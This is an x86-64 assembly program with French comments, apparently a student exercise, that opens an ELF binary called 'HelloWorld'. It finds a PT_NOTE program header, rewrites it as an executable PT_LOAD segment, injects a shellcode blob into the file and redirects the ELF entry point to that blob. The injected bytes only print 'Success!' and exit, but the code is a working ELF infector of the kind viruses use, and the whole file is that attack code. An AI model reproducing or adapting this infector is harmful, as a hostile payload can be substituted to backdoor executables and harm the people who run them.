
section .data
    filename db "HelloWorld", 0          ; Nom du fichier ELF à analyser
    elf_message db 'ELF file detected', 0 
    ;open_success_msg db "Ouvert", 0x0A
    ;elf_header_msg db "Lu", 0x0A
    ;lecture db "DAns un header de la boucle", 0x0A   
    success_msg db "Yen a un", 0x0A ; Message de succès
    failure db "Ya rien", 0x0A; Message d'échec
    ;type db "Header type: ", 0
    nbheaders db "Number of headers: ", 0
    newline db "  ",0x0A, 0 
    newline2 db 0x0A, 0 
    success_msg2 db "PT_NOTE modifié en PT_LOAD", 0
    crise db "Crise",0x0A, 0
    test1 db "HEHEHEHEHEHEHE ",0x0A, 0
    
    
    

   


section .bss
    buffer resb 64   
    buffer2 resb 16056        
    programmheader resb 56        
    type_buffer resb 16
    bufferconv resb 16  
  

section .text
global _start

_start:
    
    mov rax, 2               
    lea rdi, [rel filename]  
    mov rsi, 2              
    syscall
    test rax, rax            
    js _exit_with_error                  
    mov r12, rax            

    ; Afficher un message après l'ouverture réussie
    ;mov rax, 1               
    ;mov rdi, 1              
    ;lea rsi, [rel open_success_msg]
    ;mov rdx, 7              
    ;syscall

   
    mov rax, 0               
    mov rdi, r12            
    lea rsi, [rel buffer]     
    mov rdx, 64              
    syscall
    test rax, rax            
    js _exit_with_error  

    ; Afficher un message après la lecture de l'en-tête ELF
   ; mov rax, 1               ; syscall: write
    ; mov rdi, 1               ; stdout
   ; lea rsi, [rel elf_header_msg]
    ;mov rdx, 28              ; Longueur du message
    ;syscall

    mov r15, [buffer + 0x18] 

    lea rbx, [rel buffer]    
    mov al, byte [rbx]      
    cmp al, 0x7f            
    jne _exit_with_error     

    inc rbx                 
    mov al, byte [rbx]
    cmp al, 0x45            
    jne _exit_with_error     

    inc rbx                  
    mov al, byte [rbx]
    cmp al, 0x4c            
    jne _exit_with_error    

    inc rbx                  
    mov al, byte [rbx]
    cmp al, 0x46            
    jne _exit_with_error     

    mov rax, 1               
    mov rdi, 1              
    lea rsi, [rel elf_message] 
    mov rdx, 17              
    syscall       

     ; Afficher saut de ligne
    mov rax, 1         
    mov rdi, 1         
    lea rsi, [rel newline2] 
    mov rdx, 1         
    syscall

    ;;lis le type
    lea rbx, [rel buffer]    
    mov ax, word [rbx+16]    
    
    movzx rdi, ax            
    lea rsi, [rel type_buffer] 
    call num_to_str          

    mov rax, 1               
    mov rdi, 1               
    lea rsi, [rel type_buffer] 
    mov rdx, 16              
    syscall      

     ; Afficher saut de ligne
    mov rax, 1          
    mov rdi, 1          
    lea rsi, [rel newline2] 
    mov rdx, 1          
    syscall



    mov rcx, [buffer + 56]     
    lea rsi, [rel bufferconv] 
    mov rdi, rcx             
    call num_to_str          

    mov rax, 1               
    mov rdi, 1               
    lea rsi, [rel nbheaders]
    mov rdx, 17             
    syscall

      ; Afficher le retour à la ligne
    ;mov rax, 1          
    ;mov rdi, 1         
    ;lea rsi, [rel newline] 
    ;mov rdx, 1          
    ;syscall

    mov rax, 1             
    mov rdi, 1               
    lea rsi, [rel bufferconv]
    mov rdx, 16              
    syscall

     ; Afficher le retour à la ligne
    mov rax, 1          
    mov rdi, 1        
    lea rsi, [rel newline2] 
    mov rdx, 1         
    syscall
    

  
    mov rbx, [buffer+ 32]    
    mov rcx, [buffer + 56]     
    mov rdx, [buffer + 54]  
    mov r13, rbx   



;itère pour chaque programme header et check son type si ptnote alors renvoi vers ptnote
boucle:
    test rcx, rcx            
    jz pasdeptnote      

    ; Afficher un message pour chaque en-tête détecté
    ;mov rax, 1               
   ; mov rdi, 1               
   ; lea rsi, [rel lecture]
    ;mov rdx, 23              
    ;syscall


    mov rax, 0              
    mov rdi, r12           
    lea rsi, [rel programmheader]     
    mov r10, rbx            
    mov rdx, 56              
    syscall
    test rax, rax            
    js _exit_with_error  

 
   ; mov rax, 1          
    ;mov rdi, 1          
    ;lea rsi, [rel type] 
   ; mov rdx, 1          
    ;syscall

    ; Afficher le type brut de l'en-tête
    mov eax, dword [programmheader]    
    mov edi, eax            
    lea rsi, [rel bufferconv]
    call num_to_str         

    mov rax, 1               
    mov rdi, 1              
    lea rsi, [rel bufferconv]
    mov rdx, 16              
    syscall

      ; Afficher le retour à la ligne
    mov rax, 1          
    mov rdi, 1        
    lea rsi, [rel newline] 
    mov rdx, 1          
    syscall

    ; Afficher le retour à la ligne
    mov rax, 1         
    mov rdi, 1        
    lea rsi, [rel newline2] 
    mov rdx, 1         
    syscall

    ; Vérifier si le type est PT_NOTE
    cmp dword [programmheader], 4   
   
    je ptnote         

    add rbx, rdx 
    add r13, 56           
    dec rcx                 
    jmp boucle

ptnote:


    ; Afficher le retour à la ligne
    mov rax, 1
    mov rdi, 1
    lea rsi, [rel test1] 
    mov rdx, 12
    syscall

    ; Afficher le retour à la ligne
    mov rax, 1
    mov rdi, 1
    lea rsi, [rel newline2] 
    mov rdx, 1
    syscall

     ; Afficher le retour à la ligne
    mov rax, 1
    mov rdi, 1
    lea rsi, [rel crise] 
    mov rdx, 5
    syscall
    ; Afficher le retour à la ligne
    mov rax, 1         
    mov rdi, 1        
    lea rsi, [rel newline2] 
    mov rdx, 1         
    syscall



    mov dword [programmheader], 1
    mov dword [programmheader+4], 0x5
    mov dword [programmheader + 0x10], 112  ; p_filesz (taille réelle)
    mov dword [programmheader + 0x14], 112  ; p_memsz (taille allouée en mémoire)
    mov dword [programmheader+8],0x3F28
    mov dword [programmheader+16],0x404000
   
         


    mov rax, 8
    mov rdi, r12
    mov rsi, r13
    mov rdx, 0
    syscall
    test rax, rax
    js _exit_with_error


    mov rax, 1
    mov rdi, r12
    lea rsi, [rel programmheader]
    mov rdx, 56
    syscall
    test rax, rax
    js _exit_with_error






    ;;;;;;;;;;;;;;;;;;;;;;;

     mov rax, 0              
    mov rdi, r12           
    lea rsi, [rel programmheader]     
    mov r10, rbx            
    mov rdx, 56              
    syscall
    test rax, rax            
    js _exit_with_error  

    add r13, 56  



     mov rax, 8
     mov rdi, r12
     mov rsi, 0x00
     mov rdx, 0
     syscall
     test rax, rax
     js _exit_with_error

    mov rax, 0               
    mov rdi, r12            
    lea rsi, [rel buffer2]     
    mov rdx, 16056              
    syscall
    test rax, rax            
    js _exit_with_error  

    mov rax, 0               
    mov rdi, r12            
    lea rsi, [rel programmheader]     
    mov rdx, 56              
    syscall
    test rax, rax            
    js _exit_with_error  

    mov rax, 8
     mov rdi, r12
     mov rsi,0x3F28
     mov rdx, 0
     syscall
     test rax, rax
     js _exit_with_error


   
     lea rsi, [rel benign_shellcode] 
     mov rdi, r12                    
     mov rdx, 43                    
     mov rax, 1                     
     syscall
     test rax, rax                   
     js _exit_with_error

    ;mov rax, 1            
   ; mov rdi, r12         
    ;mov rsi, 0x5 
    ;mov rdx, 4            
    ;syscall      


    mov rax, 1
    mov rdi, r12
    lea rsi, [rel programmheader]
    mov rdx, 56
    syscall
    test rax, rax
    js _exit_with_error



    mov rax, 1
    mov rdi, 1
    lea rsi, [rel success_msg]
    mov rdx, 8
    syscall

    ;CHanger l'offset des segments d'après
    
    mov dword [buffer+0x18],0x3F28

    mov rax, 8
     mov rdi, r12
     mov rsi, 0x00
     mov rdx, 0
     syscall
     test rax, rax
     js _exit_with_error
   

    mov rax, 1
    mov rdi, r12
    lea rsi, [rel buffer]
    mov rdx, 64
    syscall
    test rax, rax
    js _exit_with_error





    jmp close_file

    ; Afficher le retour à la ligne
    mov rax, 1         
    mov rdi, 1        
    lea rsi, [rel newline2] 
    mov rdx, 1         
    syscall




;ptnote pas trouvée
pasdeptnote:
     ;Afficher un message d'échec
    mov rax, 1               
    mov rdi, 1              
    lea rsi, [rel failure]
   mov rdx, 7            
   syscall
jmp close_file


close_file:
    ; Fermer le fichier
    mov rax, 3               
    mov rdi, r12             
    syscall
    mov rax, 60              
    xor rdi, rdi              
    syscall




num_to_str: 
    mov rbx, 10              
    xor rcx, rcx            
.num_to_str_loop:
    xor rdx, rdx             
    div rbx                 
    add dl, '0'             
    mov [rsi + rcx], dl      
    inc rcx                  
    test rax, rax            
    jnz .num_to_str_loop    
    mov byte [rsi + rcx], 0   
    ret


_exit_with_error:
    mov rax, 60              
    xor rdi, rdi             
    syscall    


benign_shellcode:
    db 0xb8, 0x01, 0x00, 0x00, 0x00   
    db 0xbf, 0x01, 0x00, 0x00, 0x00   
    db 0x48, 0x8d, 0x35, 0xef, 0x0f, 0x00, 0x00 
    db 0xba, 0x08, 0x00, 0x00, 0x00    
    db 0x0f, 0x05                      
    db 0xb8, 0x3c, 0x00, 0x00, 0x00    
    db 0x48, 0x31, 0xff                
    db 0x0f, 0x05                     
    db 0x53, 0x75, 0x63, 0x63, 0x65, 0x73, 0x73, 0x21, 0x0a
